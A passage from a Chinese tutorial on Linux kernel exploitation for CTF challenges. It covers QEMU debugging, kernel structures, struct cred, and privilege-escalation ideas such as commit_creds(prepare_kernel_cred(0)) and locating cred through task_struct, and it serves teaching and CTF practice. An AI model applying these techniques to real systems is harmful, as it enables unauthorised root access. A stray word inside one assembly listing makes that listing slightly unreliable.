来启动调试服务。</p><p>最常见的操作为在一个端口监听一个 tcp 连接. QEMU 同时提供了一个简写的方式 <code>-s</code>,表示 <code>-gdb tcp::1234</code>,即在 1234 端口开启一个 gdbserver.</p><p>以调试模式启动内核后,在另外一个终端内使用如下命令来连接到对应的 gdbserver,开始调试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q -ex &quot;target remote localhost:1234&quot;</span><br></pre></td></tr></table></figure><p>在启动内核后,使用 <code>add-symbol-file</code> 来添加符号信息，比如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure><p>当然也可以添加源码目录信息.与用户态调试相同</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>kernel也是一个程序，用来管理软件发出的数据 I/O 请求，将这些请求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/figure/Kernel_Layout.svg" alt="Kernel_Layout"></p><p>kernel 最主要的功能有两点：</p><ol><li><strong>控制并与硬件进行交互</strong></li><li><strong>提供 application 能运行的环境</strong></li></ol><p>包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，kernel 的 crash 通常会引起重启。</p><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3</p><h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><p>可加载核心模块 (或直接称为内核模块) 就像<strong>运行在内核空间的可执行程序</strong>，包括:</p><ul><li><strong>驱动程序</strong>(Device drivers)<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li><strong>内核扩展模块</strong>(modules)</li></ul><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此可以用 IDA 等工具来分析内核模块。</p><p><strong>模块可以被单独编译，但不能单独运行</strong>。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p><u>模块通常用来实现一种文件系统,一个驱动程序或者其他内核上层的功能</u>。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><ul><li><strong>insmod</strong>: 将指定模块加载到内核中</li><li><strong>rmmod</strong>: 从内核中卸载指定模块</li><li><strong>lsmod</strong>: 列出已经加载的模块</li><li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li></ul><blockquote><p>大多数CTF 中的 kernel vulnerability 也出现在 LKM 中</p></blockquote><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>man手册</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of special</span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument</span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It&#x27;s traditionally char *argp (from the days</span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line">       An ioctl() request has encoded in it whether the argument is an in parameter or</span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>可以看出 ioctl 也是一个系统调用，<strong>用于与设备通信。</strong></p><p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><blockquote><p>使用 ioctl 进行通信的原因：</p><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</p><p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p><p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为<strong>设备驱动的<u>模块</u></strong>，驱动的代码允许在内核空间运行而且可以对设备直接寻址。<strong>一个 Ioctl 接口是一个独立的系统调用</strong>，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求<u>是一个以设备和请求号码为参数的 Ioctl 调用</u>，如此内核就允许<u>用户空间访问设备驱动</u>进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p></blockquote><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><h3 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h3><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</p></li><li><p>通过 push 保存各寄存器值，具体的代码 如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> /* 保存栈值，并设置内核栈 */</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code>。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h3 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h3><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><h2 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h2><p>之前提到 kernel 记录进程的权限，更具体的,是用 cred 结构体记录的，<strong>每个进程中都有一个 cred 结构</strong>，这个结构保存了该进程的权限等信息（uid，gid 等），<strong>如果能修改某个进程的 cred，那么也就修改了这个进程的权限</strong>。</p><p>源码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h2><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li>printf() -&gt; <strong>printk()</strong>，但需要注意的是 printk() <u>不一定会把内容显示到终端上，但一定在内核缓冲区里</u>，可以通过 <code>dmesg</code> 查看效果</li><li>memcpy() -&gt;<strong>copy_from_user()/copy_to_user()</strong><ul><li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li><li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li></ul></li><li>malloc() -&gt; <strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li><li>free() -&gt; <strong>kfree()</strong>，同 kmalloc()</li></ul><p>另外要注意的是，<u>kernel 管理进程，因此 kernel 也记录了进程的权限</u>。kernel 中有两个可以方便的改变权限的函数：</p><ul><li><strong>int commit_creds(struct cred *new)</strong></li><li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li></ul><p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</p><blockquote><p>更多关于 <code>prepare_kernel_cred</code> 的信息可以参考 <a href="https://elixir.bootlin.com/linux/v4.6/source/kernel/cred.c#L594">源码</a></p></blockquote><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ # grep commit_creds /proc/kallsyms</span><br><span class="line">ffffffffa62f2cc0 T commit_creds</span><br><span class="line">ffffffffa785c268 r __ksymtab_commit_creds</span><br><span class="line">ffffffffa788758c r __kstrtab_commit_creds</span><br><span class="line">~ # grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line">ffffffffa62f3160 T prepare_kernel_cred</span><br><span class="line">ffffffffa7864068 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffffa7887545 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><blockquote><p>一般情况下，/proc/kallsyms 的内容需要 root 权限才能查看</p></blockquote><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><blockquote><p>canary, dep, PIE, RELRO 等保护与用户态原理和作用相同</p></blockquote><ul><li>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</li><li>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</li><li>mmap_min_addr</li></ul><h2 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h2><p>一般会给以下三个文件</p><ol><li><p>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</p></li><li><p>bzImage: kernel binary</p></li><li><p>rootfs.cpio: 文件系统映像</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar</span><br><span class="line">CISCN2017_babydriver [master●] x babydriver.tar</span><br><span class="line">boot.sh</span><br><span class="line">bzImage</span><br><span class="line">rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar  boot.sh  bzImage  rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span><br><span class="line">CISCN2017_babydriver [master●] file rootfs.cpio</span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size 2844672</span><br><span class="line">CISCN2017_babydriver [master●] file boot.sh</span><br><span class="line">boot.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">CISCN2017_babydriver [master●] bat boot.sh </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/bash</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 ro</span><br><span class="line">       │ ot=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographi</span><br><span class="line">       │ c  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>解释一下 qemu 启动的参数：</p><ul><li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li><li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li><li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li><li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 —help 查看。</li></ul></li><li><p>本地写好 exploit 后，可以通过 <u>base64 编码</u>等方式把<u>编译好的二进制文件保存到远程目录</u>下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。</p></li></ol><h1 id="CTF-kernel-aim"><a href="#CTF-kernel-aim" class="headerlink" title="CTF kernel aim"></a>CTF kernel aim</h1><p>在 Linux 内核漏洞利用中，攻击者可能会有以下几个目的</p><ul><li>提权，即获取到 root 权限。</li><li>泄露敏感信息。</li><li>DoS，即使得内核崩溃。</li></ul><p>一般而言，攻击者的主要目的是提权。</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源。这里从两种角度来考虑如何提权</p><ul><li>Change Self：通过<strong>改变自身进程的权限</strong>，使其具有 root 权限。</li><li>Change Others：通过<strong>影响高权限进程的执行</strong>，使其完成想要的功能。</li></ul><h3 id="Change-Self"><a href="#Change-Self" class="headerlink" title="Change Self"></a>Change Self</h3><p>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，<u>如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。</u></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此两种思路</p><ul><li>直接修改 cred 结构体的内容</li><li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li></ul><h4 id="直接改-cred"><a href="#直接改-cred" class="headerlink" title="直接改 cred"></a>直接改 cred</h4><h5 id="定位具体位置"><a href="#定位具体位置" class="headerlink" title="定位具体位置"></a>定位具体位置</h5><p><strong>直接定位</strong></p><p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，<u>uid-fsgid 都是执行进程的用户的身份</u>。因此可以通过扫描内存来定位 cred。</p><p>在实际定位的过程中，可能会发现很多满足要求的 cred，<u>这主要是因为 cred 结构体可能会被拷贝、释放</u>。一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p><p><strong>间接定位</strong></p><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol><hr><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p><h5 id="修改"><a href="#修改" class="headerlink" 